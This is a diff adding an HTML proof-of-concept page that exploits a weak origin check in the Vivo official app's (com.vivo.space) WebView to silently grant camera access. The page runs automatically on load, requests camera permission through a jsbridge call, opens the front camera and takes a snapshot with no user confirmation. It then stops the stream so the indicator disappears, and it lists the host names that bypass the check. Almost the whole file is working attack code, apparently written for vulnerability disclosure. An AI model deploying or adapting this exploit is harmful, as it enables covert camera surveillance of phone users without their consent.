@@ -1,0 +1,139 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Silent Camera POC</title>
+    <style>
+        body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 10px; margin: 0; }
+        h3 { color: #e94560; }
+        #log { background: #16213e; padding: 8px; border-radius: 4px; font-size: 12px; white-space: pre-wrap; word-break: break-all; }
+        video { width: 100%; max-width: 320px; border: 2px solid #e94560; border-radius: 4px; display: none; }
+        canvas { display: none; }
+        #snapshot { width: 100%; max-width: 320px; border: 2px solid #0f3460; border-radius: 4px; display: none; }
+        .step { margin: 8px 0; padding: 6px; background: #0f3460; border-radius: 4px; font-size: 13px; }
+        .step.success { background: #1a6b3c; }
+        .step.fail { background: #6b1a1a; }
+    </style>
+</head>
+<body onload="exploit()">
+    <h3>Vivo WebView - Silent Camera POC</h3>
+    <div id="log"></div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <img id="snapshot">
+
+<script>
+function log(msg) {
+    document.getElementById('log').innerHTML += '<div class="step">' + msg + '</div>';
+}
+
+function logOk(msg) {
+    document.getElementById('log').innerHTML += '<div class="step success">' + msg + '</div>';
+}
+
+function logFail(msg) {
+    document.getElementById('log').innerHTML += '<div class="step fail">' + msg + '</div>';
+}
+
+function requestCameraPermission() {
+    log('[Step 1] Requesting CAMERA permission via jsbridge applyPermissions...');
+    try {
+        location.href = "jsbridge://javacall/applyPermissions?callback=onPermResult&data=" + JSON.stringify(
+            {"permissionList":["android.permission.CAMERA"],"requestCode":200}
+        );
+    } catch(e) {
+        logFail('[Step 1] jsbridge call failed: ' + e.message);
+    }
+}
+
+// jsbridge callback - will be called by the native side
+function onPermResult(result) {
+    logOk('[Step 1] Permission result: ' + JSON.stringify(result));
+    openCamera();
+}
+
+function openCamera() {
+    log('[Step 2] Calling navigator.mediaDevices.getUserMedia({ video: true })...');
+    log('[Step 2] This triggers onPermissionRequest -> g.e()/g.d() weak check -> silent grant()');
+
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        logFail('[Step 2] getUserMedia not supported');
+        return;
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+        .then(function(stream) {
+            logOk('[Step 2] Camera stream obtained! No user confirmation was shown.');
+            logOk('[Step 2] Stream tracks: ' + stream.getVideoTracks().length);
+            var track = stream.getVideoTracks()[0];
+            logOk('[Step 2] Camera label: ' + track.label);
+            logOk('[Step 2] Camera ready: ' + track.readyState);
+
+            var video = document.getElementById('video');
+            video.srcObject = stream;
+            video.style.display = 'block';
+
+            // Wait for video to start playing, then capture snapshot
+            video.onloadedmetadata = function() {
+                video.play();
+                log('[Step 3] Video playing. Capturing silent snapshot in 3 seconds...');
+                setTimeout(function() { captureSnapshot(stream); }, 3000);
+            };
+        })
+        .catch(function(err) {
+            logFail('[Step 2] getUserMedia failed: ' + err.name + ' - ' + err.message);
+            log('[Step 2] Note: If CAMERA runtime permission was denied, try clicking the button below after granting it.');
+        });
+}
+
+function captureSnapshot(stream) {
+    var video = document.getElementById('video');
+    var canvas = document.getElementById('canvas');
+    var ctx = canvas.getContext('2d');
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+
+    var dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+    var snapshot = document.getElementById('snapshot');
+    snapshot.src = dataUrl;
+    snapshot.style.display = 'block';
+
+    logOk('[Step 3] Silent snapshot captured! (see image below)');
+    logOk('[Step 3] Image data size: ' + Math.round(dataUrl.length / 1024) + ' KB');
+    log('[Step 3] In a real attack, this image would be silently uploaded to attacker server.');
+
+    // Stop camera to be stealthy
+    stream.getTracks().forEach(function(t) { t.stop(); });
+    video.style.display = 'none';
+    log('[Step 3] Camera stream stopped. Green indicator should disappear.');
+}
+
+function exploit() {
+    log('=== Vivo WebView Silent Camera PoC ===');
+    log('Target: com.vivo.space (vivo official app)');
+    log('Vuln: onPermissionRequest -> g.e()/g.d() weak origin check -> silent grant()');
+    log('');
+    log('Attack chain:');
+    log('1. jsbridge applyPermissions -> request CAMERA runtime permission (system dialog)');
+    log('2. getUserMedia({video:true}) -> onPermissionRequest triggered');
+    log('3. g.e() checks host.contains("facepay") -> BYPASSED');
+    log('4. c() calls permissionRequest.grant() -> SILENT, no user confirmation');
+    log('5. Camera stream obtained, snapshot captured silently');
+    log('');
+    log('Deeplink to trigger:');
+    log('');
+    log('Host MUST contain "facepay" or have first subdomain contain "kyc"/"ida"');
+    log('to bypass g.e()/g.d() weak checks in com.vivo.space.web.g');
+    log('');
+    log('----------------------------------------');
+
+    // Auto-start after a brief delay to allow page to settle
+    setTimeout(requestCameraPermission, 500);
+}
+</script>
+</body>
+</html>
